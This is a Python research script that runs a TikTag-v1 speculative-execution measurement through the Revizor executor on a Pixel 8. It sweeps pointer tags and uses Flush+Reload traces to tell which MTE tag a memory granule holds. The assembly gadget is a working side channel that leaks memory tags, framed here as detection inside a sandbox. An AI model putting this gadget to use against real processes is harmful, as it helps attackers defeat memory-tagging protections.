#!/usr/bin/env python3
"""TikTag-v1 (speculation-shrinkage MTE tag leak) detector driven through the Revizor kernel
executor (/dev/executor) on the Pixel 8 Cortex-X3.

The test case is one self-contained program that carries the whole TikTag-v1 measurement: a training
loop whose final iteration is the attack. Each iteration flushes a self-dependent slow load and the
probe line, then a forward conditional branch is architecturally taken on the attack iteration and
not-taken on the training iterations. The training iterations fall through and run the body with the
granule's own tag, so the forward branch is predicted not-taken; the attack iteration is then taken
architecturally but speculated down the fall-through path. On that speculated path a tag-checked load
uses a pointer whose tag is swept, followed by a serial `orr` chain that feeds the probe address (so
the probe issues only after the chain's latency) and then the probe load. A tag mismatch shrinks the
speculative window so the probe never issues and its L1 line stays absent; a matching tag keeps the
window open and the probe fills its line.

The probe address on the training iterations points at a throwaway cache set, so the read set is
touched only by the attack iteration's speculation. The host reads the read set's L1 residency from
the executor's Flush+Reload htrace over many runs. Sweeping the pointer tag over all sixteen values,
the read set stays resident for the tag that matches the granule (and for the TCMA-unchecked tag,
whose access is never checked) and is absent for every other checked tag. Resealing the granule to a
different tag moves the surviving checked tag with it, which is the detection.
"""
import argparse
import os
import re
import subprocess
import sys
import tempfile

MTE_UNCHECKED = {15}          # TCMA1 leaves tag 0b1111 unchecked on the sandbox base region
GRANULE_TAGS = 512            # one allocation tag per 16-byte granule across the 4 KiB main region
DEV = "/data/local/tmp"
EU = f"{DEV}/executor_userland /dev/executor"
HERE = os.path.dirname(os.path.abspath(__file__))
BUILD = tempfile.mkdtemp(prefix="tiktag_v1_")   # generated asm/bin/reif live here, never in the source tree


def parse_args():
    p = argparse.ArgumentParser(
        description="Detect TikTag-v1 through the Revizor executor on the Pixel 8 Cortex-X3.",
        epilog="example:\n"
               "  tiktag_v1_executor.py --repo ~/revizor/sca-fuzzer --adb-host 127.0.0.1 "
               "--adb-port 5037 --core 8 --iters 512 --ldnum 16 --gap 80 --read-set 32 "
               "--warm-set 48 --reps 60 --seal-tags 5,9,10",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--repo", required=True, help="path to the sca-fuzzer checkout")
    p.add_argument("--adb-host", required=True, help="adb server host")
    p.add_argument("--adb-port", required=True, type=int, help="adb server port")
    p.add_argument("--core", required=True, type=int, help="CPU to pin to (Cortex-X3 = 8)")
    p.add_argument("--iters", required=True, type=int, help="training-loop iterations (last is the attack)")
    p.add_argument("--ldnum", required=True, type=int, help="speculative tag-checked guess loads per iteration")
    p.add_argument("--gap", required=True, type=int, help="serial orr-chain length feeding the probe address")
    p.add_argument("--read-set", required=True, type=int, help="L1D set probed on the attack iteration")
    p.add_argument("--warm-set", required=True, type=int, help="L1D set probed on the training iterations")
    p.add_argument("--reps", required=True, type=int, help="measurement repeats per pointer tag")
    p.add_argument("--seal-tags", required=True,
                   help="comma-separated granule tags to seal and detect, e.g. 5,9,10")
    p.add_argument("--margin", type=float, default=0.3,
                   help="minimum residency gap between the matching tag and every checked mismatch")
    return p.parse_args()


def connect(host, port):
    from ppadb.client import Client
    devices = Client(host, port).devices()
    if not devices:
        sys.exit(f"no device on adb {host}:{port}")
    return devices[0]


def su(dev, cmd):
    return dev.shell(f"su -c '{cmd}'")


def gadget_asm(ldnum, gap, iters):
    lines = [
        f"mov x3, #{iters}",
        ".Lloop:",
        "subs x3, x3, #1",             # Z set on the final (attack) iteration
        "csel x6, x5, x1, eq",         # guess pointer: attack = swept tag, training = granule tag
        "csel x10, x2, x4, eq",        # probe pointer: attack = read set, training = throwaway set
        "cset x7, ne",                 # training flag = (iteration is not the attack)
        "ldr x12, [x1]",               # warm the guess granule via its own tag (architectural, no fault)
        "str x7, [x0]",                # slow-load value = training flag
        "dc civac, x0",                # flush the slow-load line -> long speculative window
        "dc civac, x2",                # flush the read set
        "dc civac, x4",                # flush the throwaway set
        "dsb sy",
        "isb",
        "ldr x8, [x0]",                # slow load: training -> 1 (fall through), attack -> 0 (taken)
        "cbz x8, .Lskip",              # forward branch, predicted not-taken from the training iterations
    ]
    lines += ["ldr x9, [x6]"] * ldnum  # tag-checked guess load(s); granule holds zero
    lines += ["orr x10, x10, x9"] * gap  # serial latency chain into the probe address (value stable at zero)
    lines += ["ldr x11, [x10]", ".Lskip:", "cbnz x3, .Lloop"]
    return "\n".join(lines) + "\n"


def build_test_case(repo, ldnum, gap, iters):
    compile_tc = os.path.join(repo, "src/executor_userland/asm_compiler/compile_test_case.py")
    asm_path = os.path.join(BUILD, "tiktag_v1.asm")
    bin_path = os.path.join(BUILD, "tiktag_v1.bin")
    with open(asm_path, "w") as f:
        f.write(gadget_asm(ldnum, gap, iters))
    r = subprocess.run([sys.executable, compile_tc, "--input", asm_path, "--output", bin_path],
                       capture_output=True)
    if r.returncode:
        sys.exit("compile_test_case failed:\n" + r.stderr.decode())
    return bin_path


def make_input(repo, main_base, probe_set, warm_set, granule_tag, pointer_tag):
    from src.interfaces import Input
    from src.aarch64.aarch64_executor_input_encoder import ExecutorInput
    inp = Input(1)
    inp.view("uint64")[:] = 0
    gpr = inp[0]["gpr"]
    gpr[0] = main_base + 0x400                                      # slow/condition pointer
    gpr[1] = (main_base & ~(0xF << 56)) | (granule_tag << 56)      # granule-tag pointer (training guess)
    gpr[2] = main_base + probe_set * 64                            # attack probe -> read set
    gpr[4] = main_base + warm_set * 64                             # training probe -> throwaway set
    gpr[5] = (main_base & ~(0xF << 56)) | (pointer_tag << 56)      # swept-tag pointer (attack guess)
    mte_tags = [15] * GRANULE_TAGS                                # every granule unchecked by default
    mte_tags[0] = granule_tag                                     # seal the guess granule
    return ExecutorInput(input_=inp, mte_tags=mte_tags).serialize()


def set_regime(dev, core):
    for name, value in (("measurement_mode", "F+R"), ("warmups", "1"),
                        ("enable_pre_run_flush", "1"), ("enable_phr_flush", "0"),
                        ("enable_view_rotation", "0"), ("reload_isolate", "0"),
                        ("reload_random_order", "0"), ("enable_ssbs", "0")):
        su(dev, f"echo {value} > /sys/executor/{name}")
    su(dev, f"echo {core} > /sys/executor/pin_to_core")


def residency_rate(output, read_set):
    index = 63 - read_set
    traces = re.findall(r"htrace 0:\s*([01]{64})", output)
    if not traces:
        return -1.0
    return sum(int(t[index]) for t in traces) / len(traces)


def main():
    args = parse_args()
    repo = os.path.expanduser(args.repo)
    sys.path.insert(0, repo)
    from src.config import CONF
    CONF.load(os.path.join(repo, "config_g1_x3.yml"))

    seal_tags = [int(t) for t in args.seal_tags.split(",")]
    for t in seal_tags:
        if t in MTE_UNCHECKED:
            sys.exit(f"tag {t} is TCMA-unchecked and cannot be used as a sealed granule tag")

    dev = connect(args.adb_host, args.adb_port)
    main_base = int(su(dev, "cat /sys/executor/print_sandbox_base").strip(), 16)

    dev.push(os.path.join(HERE, "run_tag.sh"), f"{DEV}/run_tag.sh")
    su(dev, f"chmod 755 {DEV}/run_tag.sh")
    bin_path = build_test_case(repo, args.ldnum, args.gap, args.iters)
    dev.push(bin_path, f"{DEV}/tiktag_v1.bin")
    su(dev, f"chmod 666 {DEV}/tiktag_v1.bin")
    set_regime(dev, args.core)
    su(dev, f"{EU} 1 >/dev/null; {EU} w {DEV}/tiktag_v1.bin >/dev/null")

    print(f"sandbox base {hex(main_base)}  core {args.core}  iters {args.iters}  ldnum {args.ldnum}  "
          f"gap {args.gap}  read set {args.read_set}  reps {args.reps}")
    detected = True
    for granule_tag in seal_tags:
        rate = {}
        for pointer_tag in range(16):
            reif = os.path.join(BUILD, f"tiktag_v1_in{pointer_tag}.reif")
            with open(reif, "wb") as f:
                f.write(make_input(repo, main_base, args.read_set, args.warm_set, granule_tag, pointer_tag))
            dev.push(reif, f"{DEV}/tiktag_v1_in{pointer_tag}.reif")
            su(dev, f"chmod 666 {DEV}/tiktag_v1_in{pointer_tag}.reif")
            out = su(dev, f"sh {DEV}/run_tag.sh {DEV}/tiktag_v1_in{pointer_tag}.reif {args.reps}")
            rate[pointer_tag] = residency_rate(out, args.read_set)

        checked_mismatch = [rate[t] for t in range(16) if t != granule_tag and t not in MTE_UNCHECKED]
        winner = max((t for t in range(16) if t not in MTE_UNCHECKED or t == granule_tag),
                     key=lambda t: rate[t])
        gap = rate[granule_tag] - max(checked_mismatch)
        passed = winner == granule_tag and gap >= args.margin
        detected = detected and passed
        print(f"\nsealed granule tag {granule_tag}")
        print("  " + " ".join(f"{t}:{rate[t]:.2f}" for t in range(16)))
        print(f"  matching tag {granule_tag} residency {rate[granule_tag]:.2f}  "
              f"checked-mismatch max {max(checked_mismatch):.2f} mean "
              f"{sum(checked_mismatch) / len(checked_mismatch):.2f}  separation {gap:+.2f}  "
              f"{'DETECTED' if passed else 'not detected'}")

    print(f"\n{'TikTag-v1 DETECTED' if detected else 'not detected'} "
          f"on core {args.core} for sealed tags {seal_tags}")
    sys.exit(0 if detected else 1)


if __name__ == "__main__":
    main()
